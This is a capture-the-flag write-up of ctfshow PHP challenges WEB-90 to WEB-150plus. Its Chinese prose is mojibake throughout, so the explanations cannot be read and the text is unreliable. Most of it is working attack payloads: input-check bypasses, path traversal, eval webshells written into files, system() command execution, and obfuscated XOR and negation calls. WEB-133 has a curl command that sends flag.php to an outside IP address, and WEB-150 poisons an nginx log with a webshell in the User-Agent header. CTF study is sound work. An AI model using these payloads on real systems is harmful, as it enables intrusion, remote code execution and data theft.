WEB-90,92(intvalåå…­è¿›åˆ¶)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688001800190-41a53fa2-0b5d-493c-87c5-1a02b998984b.png)\n\nç”¨16è¿›åˆ¶å³å¯\n\n```\n?num=0x117c\n```\n\n# WEB-91(å¤šè¡ŒåŒ¹é…ç»•è¿‡)\n\n```\npreg_match('/^php$/im', $a)\n```\n\n`^`:åŒ¹é…phpå¼€å¤´\n\n`$`:åŒ¹é…phpç»“å°¾\n\n`i`ï¼šå¤§å°å†™\n\n`m`:å¤šè¡ŒåŒ¹é…\n\næ‰€ä»¥ç”¨æ¢è¡Œç¬¦`%0a`ç»•è¿‡å°±è¡Œ\n\n```\n?cmd=a%0aphp\n```\n\n# WEB-93(intvalå…«è¿›åˆ¶)\n\nå’Œ90ï¼Œ92ä¸€æ ·ä¸è¿‡è¿™æ¬¡wafäº†å­—æ¯ç”¨å…«è¿›åˆ¶bypasså³å¯\n\n```\n?num=010574\n```\n\n# WEB-94(intvalå°æ•°ç‚¹)\n\nä¸èƒ½0å¼€å¤´ä¹Ÿå°±ä¸èƒ½ç”¨å…«è¿›åˆ¶äº†ï¼Œç”¨å°æ•°ç‚¹å³å¯\n\n```\n?num=4476.0\n```\n\n# WEB-95(intvalç©ºæ ¼)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688004410684-16da55e9-452a-47f0-81d4-7bc609301c4f.png)\n\n```\n?num=+010574\n?num= 010574\n?num=%20010574\n```\n\n# WEB-96(è·¯å¾„)\n\n```\n?u=./flag.php\n```\n\n`./`è¡¨ç¤ºå½“å‰è·¯å¾„ä¸‹\n\n# WEB-97(md5)\n\nç»å…¸é¢˜å‹äº†ï¼Œä¸å¤šè¯´\n\næ•°ç»„ æˆ–è€… ç›´æ¥å»æ‰¾0eå¼€å¤´çš„payloadéƒ½å¯ä»¥\n\npost:`a[]=1&b[]=2`\n\n# WEB-98(ä¸‰å…ƒè¿ç®—ç¬¦)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688091408059-222ec5ac-7d19-4d00-81d7-ed3ad0903d6d.png)\n\nä¸ç”¨ç®¡ä¸­é—´çš„ åªçœ‹ç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œ\n\nå½“æˆ‘ä»¬æäº¤ä¸€ä¸ªgetä¼ å‚å°±ä¼šè®©å…¶ç­‰äºpostä¼ å‚çš„å€¼ è¿™é‡Œç”¨åˆ°äº†å–åœ°å€ç¬¦ ç›´æ¥ç”¨cçš„çŸ¥è¯†å»ç†è§£å°±è¡Œäº†\n\n```\n$_GET?$_GET=&$_POST:'flag';\nhighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n```\n\næ‰€ä»¥payload:\n\n```\n?HTTP_FLAG=flag\npost:HTTP_FLAG=flag\n```\n\n# WEB-99(in_array)\n\nä¸»è¦æ˜¯in_arrayè¿™ä¸ªå‡½æ•° è¿™ä¸ªå‡½æ•°æ˜¯æ£€æµ‹ä¸€ä¸ªå­—ç¬¦æ˜¯å¦åœ¨ä¸€ä¸ªæ•°ç»„ä¸­ \n\nå¦‚æœè¿™ä¸ªå‡½æ•°ä¸è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° åˆ™è¡¨ç¤ºåœ¨æ£€æµ‹ä¸­ä¸ä¼šæ£€æŸ¥è¦æ£€æµ‹çš„å€¼æ˜¯å¦ä¸æ•°ç»„ä¸­çš„å€¼ç±»å‹ç›¸åŒ å¹¶ä¸”è‡ªåŠ¨è½¬æ¢\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688093098547-696073aa-4215-4dea-8a30-947858c0ce4f.png)\n\næ‰€ä»¥æˆ‘ä»¬è¾“å…¥1.phpæœ€åä¹Ÿè¢«ä¼šè®¤ä¸ºæ˜¯1\n\n```\npayload:?n=1.php\npost:content=<?php @eval($_POST[x]);\n```\n\n# WEB-100(è¿ç®—ç¬¦ä¼˜å…ˆçº§)\n\n```\n&& > || > = > and > or\n```\n\n=çš„è¿ç®—ç¬¦æ¯”andé«˜\n\nå¯¹äºv0çš„å€¼åªéœ€è¦çœ‹v1å°±å¯ä»¥v2,v3æ˜¯å¹²æ‰°\n\n```\n?v1=1&v2=print_r($ctfshow)&v3=;\n```\n\n# WEB-101(åå°„ç±»)\n\nåå°„ç±»ä¹‹å‰åšé¢˜æœ‰é‡åˆ°è¿‡\n\nåŸç†ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688094287598-543d0f24-a471-4c46-9e78-ea12c3a25e91.png)\n\nä¸€ä¸ªç®€å•çš„demoæ¥ç†è§£payload\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688094259742-560322f7-8861-4ca4-ab38-e3ac4bf26c9a.png)\n\npayloadï¼š`?v1=1&v2=echo new Reflectionclass&v3=;`\n\n# WEB-102~103(hex2bin)\n\nåˆ©ç”¨æ•°å­— hex2bin()å‡½æ•° å†™shell\n\nç„¶åå†ç”¨ä¼ªåè®®base64å†™è§£ç  å°†shellå†™è¿›å» \n\n```php\n<?=`cat *`;\n```\n\npayloadç»™çš„é€šè¿‡base64ç¼–ç åœ¨è½¬ä¸º16è¿›åˆ¶ åˆšå¥½ä¸ºçº¯æ•°å­— å…¶ä»–çš„payloadå¯èƒ½å¤¹æ‚å­—æ¯ æŒºå·§å¦™çš„\n\n```php\n?v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-\ndecode/resource=1.php\npostï¼šv1=hex2bin\n```\n\n# WEB-104ï¼Œ106(å¼±ç›¸ç­‰)\n\nç½‘ä¸Šéšä¾¿æ‰¾0eå¼€å¤´çš„å€¼å³å¯\n\n```\n?v2=aaK1STfY\n```\n\npost `v1=aaO8zKZF`\n\n# WEB-105(å˜é‡è¦†ç›–)\n\nå‡ºå£å…¶å®æ˜¯è¿™é‡Œ ä¸€å¼€å§‹æ²¡å¼„æ˜ç™½ å…¶å®é¢˜ç›®ä¸€å¼€å§‹è¿›å»å†…å®¹å°±æ˜¯erroræŠ¥å‡ºæ¥çš„ çœŸè¯¥æ­»å•Šæˆ‘\n\n```php\nif(!($_POST['flag']==$flag)){\n    die($error);\n}\n```\n\n `?suces=flag`\n\npostï¼š`error=suces`\n\n# WEB-107ï¼ˆparse_strï¼‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688102102333-8c35f4a6-9b9e-4b2a-a1b0-747d250d7998.png)\n\nä¸€ä¸ªé€»è¾‘é—®é¢˜\n\npost:`v1=flag=0cc175b9c0f1b6a831c399e269772661`\n\n```\n?v3=a\n```\n\nå…¶ä¸­æ•£åˆ—å€¼æ˜¯açš„md5å€¼\n\n# WEB-108(eregç»•è¿‡)\n\nereg æ˜¯ä¸€ä¸ªå·²ç»è¿‡æ—¶çš„å‡½æ•°ï¼Œç”¨äºè¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…ã€‚å®ƒç”¨äºæ£€æŸ¥ç»™å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ä¸æŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼åŒ¹é…ã€‚  \n\nåœ¨php5.3.0æ ‡è®°ä¸ºè¿‡æ—¶å¹¶ä¸”åœ¨7.0.0å®Œå…¨ç§»é™¤\n\nä»–çš„åŠŸèƒ½å°±è¢«preg_matchä»£æ›¿\n\neregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´äº†æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡,æ‰€ä»¥å¯ä»¥ä½¿ç”¨%00æˆªæ–­æ­£åˆ™åŒ¹é…ã€‚\n\n```\n?c=a%00778\n```\n\n# WEB-109(Exceptionç±»)\n\nå‘ç°è¿™ä¸ªåå°„ç±»å’Œå¼‚å¸¸ç±»è¿˜èƒ½é…åˆå‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸€èµ·ç”¨çœŸçš„é•¿è§è¯†äº†\n\n## æ–¹æ³•ä¸€ åå°„ç±»\n\n```\n?v1=ReflectionClass&v2=system('cat fl36dg.txt')\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688103095547-7f1b0169-dc56-4574-8e5c-450fa942d6c9.png)\n\n## æ–¹æ³•äºŒ å¼‚å¸¸ç±»\n\n```\n?v1=Exception&v2=system(\"ls\")\n```\n\n# WEB-110 (åŸç”Ÿç±»)\n\n`?v1=FilesystemIterator&v2=getcwd`ç„¶åç›´æ¥è®¿é—®flagæ–‡ä»¶å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688105770334-d07ff653-1866-418e-91e6-d62e41619def.png)\n\ngetcwdè·å¾—å½“å‰ç›®å½•ä¹‹åä¼ å…¥FilesystemIterator éå†æŒ‡å®šè·¯å¾„æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç›®å½•å’Œæ–‡ä»¶  \n\nä¸è¿‡å¦‚æœæƒ³éå†éœ€è¦ä¸æ–­çš„ç§»åŠ¨æŒ‡é’ˆä¸ç„¶åªä¼šæ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶\n\nå½“ç„¶è¿™é“é¢˜ç›®å¤Ÿç”¨äº†\n\n# WEB-111(å…¨å±€å˜é‡)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688106245109-cf261e28-2259-43a2-9e3d-265ab8a40493.png)\n\n`?v1=ctfshow&v2=GLOBALS`å­¦åˆ°äº†\n\n# WEB-112,114ï¼ˆä¼ªåè®®ï¼‰\n\n```php\nphp://filter/resource=flag.php\nphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\nphp://filter/read=convert.quoted-printable-encode/resource=flag.php\ncompress.zlib://flag.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688106680369-5ac1b3d9-64c6-427e-a427-671e9b461c49.png)\n\n# WEB-113(è½¯é“¾æ¥)\n\n```\n?file=compress.zlib://flag.php\n```\n\næˆ–è€…\n\n```php\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p\nroc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\nc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/\nself/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se\nlf/root/proc/self/root/var/www/html/flag.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688107482764-a9e34e0f-7270-4035-9c8f-457502df220b.png)\n\n/proc/self/rootå…¶å®æ˜¯æŒ‡å‘æ ¹ç›®å½•çš„è½¯é“¾æ¥ \n\nçœ‹åˆ«äººçš„WPè¯´æ˜¯ è¶…è¿‡20æ¬¡è½¯è¿æ¥åå°±å¯ä»¥ç»•è¿‡is_file\n\nä¸å¤ªæ‡‚ æŒºç¥å¥‡çš„\n\n# WEB-114(%0c)\n\n```\n?num=%0c36\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688108120944-d14869fb-39e4-4703-bd79-2872e2072781.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688108142156-8b475290-13f0-4a7b-93e1-2e4a50541c91.png)\n\n# WEB-123(phpå‘½åè§„åˆ™)\n\nè€ç”Ÿå¸¸è°ˆäº† phpåˆæ³•å‘½åè§„åˆ™æ˜¯å­—æ¯æ•°å­—ä¸‹åˆ’çº¿å…¶ä»–å­—ç¬¦ä¼šè¢«æ›¿æ¢ä¸º_\n\npost:`CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag`\n\nä½†æ˜¯å¦‚æœå‡ºç°`[`åˆ™è¿™ä¸ªç¬¦å·è¢«æ›¿æ¢ä¸º`_`ä¹‹åçš„ä¸åˆæ³•å­—ç¬¦éƒ½ä¸ä¼šè¢«æ›¿æ¢\n\n\n\n# WEB-125(highlight_file)\n\npostï¼š`CTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[1])`\n\n```\n?1=flag.php\n```\n\nä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆinlcude show_sourceä¸è¡Œ å¥‡æ€ª\n\n# WEB-126($_SERVER['argv'])\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688109739182-2e95e334-c1c5-4c24-bb86-a83cdf262a1a.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688110255660-5da2293b-64eb-46eb-9528-cafd71b8f5a9.png)\n\n```php\nGET:?a=1+fl0g=flag_give_me\nPOST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])\nGET:?$fl0g=flag_give_me\nPOST:CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])\nè¿™é‡Œfl0gè¦åŠ $åŸå› æ˜¯èµ·åˆ°ä¸€ä¸ªå®šä¹‰å˜é‡èµ‹å€¼çš„ä½œç”¨\n```\n\n\n\n# WEB-127($_SERVER['QUERY_STRING'])\n\n`?ctf show=ilove36d`è¿˜æ˜¯å‘½åé—®é¢˜ ç©ºæ ¼ä¼šè¢«æ›¿æ¢ä¸º_ä»è€Œç»•è¿‡waf\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688110594778-30b57f7d-7907-40eb-93cc-8a4a470c1d8c.png)\n\n# WEB-128ï¼ˆ _()å‡½æ•°ï¼‰\n\nç¡®å®æ˜¯éªšæ“ä½œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688111115406-d1578f30-f2d8-43e3-a4c0-09766e2f44ed.png)\n\nåœ¨å½“å‰åŸŸæŸ¥æ‰¾ä¿¡æ¯\n\n_()æ˜¯gettext()çš„æ‹“å±•å‡½æ•°\n\nåœ¨å¼€å¯ç›¸å…³è®¾å®šåï¼Œ_(\"666\")ç­‰ä»·äºgettext(\"666\")ï¼Œä¸”å°±è¿”å›å…¶ä¸­çš„å‚æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688111164735-682b1a73-54d6-4627-925d-567431cb0158.png)\n\næ‰“ç»„åˆæ‹³å³å¯\n\n```\n?f1=_&f2=get_defined_vars\n```\n\n# WEB-129(è·¯å¾„ç©¿è¶Š)\n\n```\n?f=/ctfshow/../../../../var/www/html/flag.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688181066895-d67b5acc-fcc2-4c1c-ae85-c64c8e387a3c.png)\n\n# WEB-130(æ­£åˆ™ç»•è¿‡)\n\n## æ–¹æ³•ä¸€ï¼š\n\nåˆ©ç”¨æ•°ç»„ \n\npreg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸² æ‰€ä»¥è¾“å…¥æ•°ç»„ä¼šè¾“å‡ºfalse\n\n## æ–¹æ³•äºŒï¼š\n\nå­—ç¬¦ä¸²è§£æç‰¹æ€§ \n\n` f=ctfshow`æ³¨æ„fä¹‹å‰æœ‰ä¸ªç©ºæ ¼ è¿™æ ·å°±è¯†åˆ«ä¸åˆ°æˆ‘ä»¬çš„fäº†\n\n# WEB-131(æ­£åˆ™å›æº¯)\n\npocå¦‚ä¸‹ï¼š\n\n```python\nimport requests\n\npayload = {\n    \"f\":'a'*1000000+\"36Dctfshow\"\n}\n\nr = requests.post(url='http://98e6cfab-efcc-4d13-815e-67de6479bc0d.challenge.ctf.show/',data=payload)\nprint(r.text)\n```\n\n# WEB-132(é€»è¾‘è¿ç®—ç¬¦ç‰¹æ€§)\n\n```\n/admin/?username=admin&password=1&code=admin\n```\n\nå…ˆæ˜¯ç»™äº†ä¸€ä¸ªä¿¡æ¯å¾ˆå¤šçš„ç½‘ç«™ å…¶å®åšé¢˜å¤šäº† ç›´æ¥å°±ä¼šå»è®¿é—®/adminåå°\n\nç„¶åå¾—åˆ°æºç  æ˜¯ä¸€ä¸ªé€»è¾‘é—®é¢˜ `x && y` å½“xä¸ºfalseæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œyï¼› å¯¹äºâ€œæˆ–â€ï¼ˆ||ï¼‰ è¿ç®— ï¼š `x||y` å½“xä¸ºtrueæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œy\n\næ‰€ä»¥åªè¦ä¿è¯`username=admin` å…¶ä»–ä¸¤ä¸ªå‚æ•°ä»»æ„å³å¯\n\n# WEB-133ï¼ˆcurlå¤–å¸¦ï¼‰\n\nè¿™é“é¢˜çœŸæ˜¯åäº† ç½‘ä¸Špayloadæ²¡ä¸€ä¸ªå¯ä»¥æ‰“é€šçš„ å¤šå¤šå°‘å°‘æ²¾ç‚¹æ¯›ç—…\n\n```php\n?F=`$F`;+curl -F xx=@flag.php 8.130.34.53:7777\n```\n\nç”¨curlå¤–å¸¦ å°±æ˜¯ä¹‹åè·Ÿä¸€ä¸ªèƒ½æ¥å—çš„VPS ç”¨äº†DNSæ¥å—ä¸åˆ° BPçš„ä¸å¤ªä¼š æœ€åè¿˜æ˜¯äº‘æœåŠ¡å™¨å¥½ç”¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688195451931-8a4d5a8b-dd2c-4b75-9a53-2083ed0cd142.png)\n\nå…¶å®å°±å¯ä»¥ç”¨åå¼¹shellä¸€æ ·å»ç†è§£ æ— å›æ˜¾å¤„ç†æ–¹å¼è€Œå·²\n\n# WEB-134(phpå˜é‡è¦†ç›–)\n\npayload:`?_POST[key1]=36d&_POST[key2]=36d`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688192649613-076f4400-50ac-4d55-a9cd-4606546a6e9e.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688192677426-9f1c89e8-d4dd-4fd6-98bc-d02ec14d245b.png)\n\nå…ˆå°†getè·å–åˆ°çš„å‚æ•°`parse_str($_SERVER['QUERY_STRING']);`æ ¹æ®`&`åˆ†å‰²æˆä¸åŒéƒ¨åˆ†\n\nç„¶å`extract($_POST);` å°†$_POSTæ•°ç»„ä¸­çš„å†…å®¹è¾“å‡ºä¸åŒçš„é”®å€¼\n\nå…±åˆ†ä¸ºä¸‹é¢ä¸‰ä¸ªæµç¨‹\n\n1. _POST[key1]=36d&_POST[key2]=36d\n2. _POST[key1]=36d       _POST[key2]=36d     parse_str()å°†å…¶åˆ†å‰²ä¸ºä¸¤éƒ¨åˆ†\n3. key1=36d  key2=36d extract()  å°†_POSTæ•°ç»„ä¸­çš„é”®å€¼å¯¼å…¥åˆ°å½“å‰ç¬¦å·è¡¨ä¸­\n\n# WEB-135ï¼ˆé‡å®šå‘è¾“å‡ºï¼‰\n\nå®˜æ–¹ç»™çš„å¤–å¸¦ä¸å¥½ç”¨\n\nç›´æ¥`?F=`$F` ;nl flag.php>1.txt`\n\næ³¨æ„ä¸­é—´æœ‰ä¸ªç©ºæ ¼ èƒ½åˆšå¥½è®©æˆªå–é•¿åº¦æ»¡6ä½ ä¸ç„¶ä¼šç ´åæˆ‘ä»¬çš„å‘½ä»¤ç»“æ„\n\n# WEB-136(teeæŒ‡ä»¤)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688196227426-c2e1c881-d3e4-4427-b599-0a4796ba0ec9.png)\n\npayload:\n\n```\n?c=ls /|tee 1\n?c=cat /f149_15_h3r3|tee 2\n```\n\nå°±æ˜¯åˆ©ç”¨ç®¡é“ç¬¦ å°†æˆ‘ä»¬å‘½ä»¤è¾“å…¥çš„ä½œä¸ºteeæŒ‡ä»¤çš„è¾“å…¥ ç„¶åè¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­\n\n# WEB-137ï¼ˆé™æ€æˆå‘˜è°ƒç”¨æ–¹æ³•ï¼‰\n\nphpé€šè¿‡ ç±»å::å±æ€§æˆ–è€…æ–¹æ³• æ¥è°ƒç”¨é™æ€æˆå‘˜\n\npostï¼š\n\n```\nctfshow=ctfshow::getFlag\n```\n\n# WEB-138ï¼ˆcall_user_func()æ•°ç»„ç‰¹æ®Šæ–¹æ³•ï¼‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688197391282-d0774a24-8062-4b0f-838a-baa064aeaeed.png)\n\né€šè¿‡ä¸Šé¢çš„demo è¿™æ ·payloadå¯ä»¥çœ‹æ‡‚ \n\nä¸ä»…æ˜¯å­—ç¬¦ä¸² å¯ä»¥ç»™call_user_func()ä¼ ä¸€ä¸ªæ•°ç»„çš„æ–¹å¼å»è®¿é—®é™æ€æ–¹æ³• åªèƒ½æ˜¯æ–¹æ³• ä¸èƒ½è¿™æ ·è®¿é—®é™æ€å±æ€§\n\nå¹¶ä¸”ä¹Ÿåªèƒ½æ˜¯é™æ€æ–¹æ³• ä¸èƒ½æ˜¯publicæ–¹æ³•\n\npostï¼š`ctfshow[0]=ctfshow&ctfshow[1]=getFlag`\n\n# WEB-139ï¼ˆæ²¡å¿…è¦ï¼‰\n\n# WEB-140(å¼±ç›¸ç­‰)\n\nå·çš„payload\n\n**0==â€œå­—ç¬¦ä¸²â€** **è¿”å›çš„æ˜¯TRUE**\n\nintvalä¼šå°†éæ•°å­—å­—ç¬¦è½¬æ¢ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´ `intval('a')==0 intval('.')==0 intval('/')==0`\n\n```php\nmd5(phpinfo())\nmd5(sleep())\nmd5(md5())\ncurrent(localeconv)\nsha1(getcwd())     å› ä¸º/var/www/html md5åå¼€å¤´çš„æ•°å­—æ‰€ä»¥æˆ‘ä»¬æ”¹ç”¨sha1\n```\n\n# WEB-141(å–åä¹‹å‡å·)\n\nç»•è¿‡returnçš„æ–¹å¼ï¼š\nphpä¸­æ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ 1-phpinfo()-1;ç»“åˆå‡å·æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ è¿ç®—ç¬¦åº”è¯¥éƒ½å¯ä»¥\n\n# WEB-142\n\n```\n?v1=0\n?v1=0x0\n```\n\n# WEB-143(å–åä¹‹ä¹˜å·)\n\n`?v1=10&v2=0&v3=*(\"%0c%19%0c%5c%60%60\"^\"%7f%60%7f%28%05%0d\") (\"%0e%0c%00%00\"^\"%60%60%20%2a\")?>`wafäº†å‡å· æ¢æˆä¹˜å·å°±è¡Œäº†\n\n# WEB-144(å–åä¹‹å‡å·)\n\n```php\n?v1=1&v2=(\"%08%02%08%08%05%0d\"^\"%7b%7b%7b%7c%60%60\")(\"%03%01%08%00%06%0c%01%07%00%0b%08%0b\"^\"%60%60%7c%20%60%60%60%60%2e%\n7b%60%7b\")&v3=-\n```\n\n# WEB-145(å–åä¹‹ä¸‰ç›®è¿ç®—ç¬¦)\n\næœ€ç»ˆæ„é€ å‡º`eval(\"return 1?phpinfo():1;\");`\n\npayload:\n\n```\n?v1=1&v2=0&v3=?(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5):\n```\n\n# WEB-146(å–åä¹‹æˆ–)\n\n```\n?v1=1&v2=1&v3=|(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5)|\n```\n\n# WEB-147(**function_name()**)\n\nå‚è€ƒï¼šhttps://paper.seebug.org/755/\n\nè®²çš„å¾ˆç»† çœ‹æºç å°±æ˜¯å¤§è‡´æ€è·¯è®©æˆ‘ä»¬å»æ„é€ ä¸€ä¸ªå‡½æ•° å¹¶ä¸”æ­£åˆ™è¦æ±‚éœ€è¦æ˜¯ç‰¹æ®Šçš„ç¬¦å·å¼€å¤´çš„ æ‰€ä»¥å¹³å¸¸çš„å‡½æ•°å°±ä¸èƒ½ç›´æ¥æ‹¿æ¥ç”¨äº†\n\nå·çš„ï¼š\n\n**åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º\\ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨\\è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚**\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥`\\`å¼€å¤´\n\næ„é€ ç±»ä¼¼äºè¿™æ ·çš„ å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¼ å…¥å‡½æ•°çš„å‚æ•° ç¬¬äºŒå‚æ•°æ˜¯å‡½æ•°å†…å®¹\n\n```plain\ncreate_function('$a,$b','return 111')\n\n==>\n\nfunction a($a, $b){\n    return 111;\n}\n```\n\nå¦‚æœæˆ‘ä»¬æƒ³æ’å…¥æˆ‘ä»¬çš„æ¶æ„ä»£ç å°±éœ€è¦sqlæ³¨å…¥é‚£æ ·é—­åˆçš„æ€è·¯\n\n```plain\ncreate_function('$a,$b','return 111;}phpinfo();//')\n\n==>\n\nfunction a($a, $b){\n    return 111;}phpinfo();//\n}\n```\n\npaylaod:\n\n```\n?show=;}system('ls');//\n```\n\npost:`ctf=%5ccreate_function`\n\n# WEB-148(ä¸­æ–‡å˜é‡)\n\nå·§å¦™çš„æ„é€ \n\n```\n?code=$å“ˆ=\"`{{{\"^\"?<>/\";${$å“ˆ}[å“¼](${$å“ˆ}[å—¯]);&å“¼=system&å—¯=tac f*\n```\n\n`{{{\"^\"?<>/\";`å¼‚æˆ–å‡ºæ¥çš„ç»“æœæ˜¯ _GET\n\n# WEB-149(æ¡ä»¶ç«äº‰)\n\nçœ‹æºç å°±æ˜¯ä¸è®©æˆ‘ä»¬åœ¨å½“å‰è·¯å¾„ä¸‹çš„å…¶ä»–æ–‡ä»¶å†™ç  å‘¢å°±å¾€index.phpé‡Œå†™\n\n```\n?ctf=index.php\n```\n\npost:`show=<?php @eval($_POST['x']);?>`\n\næˆ–è€…å°±æ˜¯æ¡ä»¶ç«äº‰ bpä¸æ–­å‘åŒ…å°±è¡Œ\n\n# WEB-150(æ—¥å¿—åŒ…å«)\n\néé¢„æœŸæ—¥å¿—åŒ…å«\n\n```php\nPOST /?isVIP=true HTTP/1.1\nHost: db1b6bfa-647b-44f9-9b63-d7fa819ee8d2.challenge.ctf.show\nContent-Length: 67\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nOrigin: http://db1b6bfa-647b-44f9-9b63-d7fa819ee8d2.challenge.ctf.show\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: <?php @eval($_POST[1]);?>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://db1b6bfa-647b-44f9-9b63-d7fa819ee8d2.challenge.ctf.show/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.2.729509020.1680361470\nConnection: close\n\nctf=%2Fvar%2Flog%2Fnginx%2Faccess.log&1=system%28%27tac+f*%27%29%3B\n```\n\nextractå˜é‡è¦†ç›–ï¼Œæ»¡è¶³isVipæ˜¯trueçš„æ¡ä»¶é™åˆ¶  \n\nUser-Agentå†™å…¥ä¸€å¥è¯æœ¨é©¬ ç„¶åå»åŒ…å«æ—¥å¿—\n\n# WEB-150plusï¼ˆ__autoloadï¼‰\n\nçœ‹äº†å¸ˆå‚…ä»¬çš„wp å¤ªå¼ºäº† æ„Ÿè§‰è¿˜æ˜¯éé¢„æœŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688269266909-1f7863f0-ea23-44c5-993e-1c4722b19107.png)\n\n_**_CLASS__ï¼ˆåŒä¸‹åˆ’çº¿åŒ…å›´çš„ç±»åï¼‰æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å¸¸é‡ï¼Œå®ƒä¼šåœ¨è¿è¡Œæ—¶è¿”å›å½“å‰æ‰€åœ¨ç±»çš„ç±»åã€‚å½“ä½¿ç”¨__CLASS__ å¸¸é‡æ—¶ï¼Œå¦‚æœå½“å‰ç±»ä¸å­˜åœ¨ï¼Œä¼šè§¦å‘è‡ªåŠ¨åŠ è½½æœºåˆ¶å°è¯•åŠ è½½å¯¹åº”çš„ç±»æ–‡ä»¶ã€‚**  \n\n`?..CTFSHOW..=phpinfo`ä¸è®©æˆ‘ä»¬è¾“å…¥`__CTFSHOW__`,é‚£ä¹ˆæˆ‘ä»¬å°±åˆ©ç”¨phpç‰¹æ€§ è®©phpå¸®æˆ‘å»è½¬æ¢ 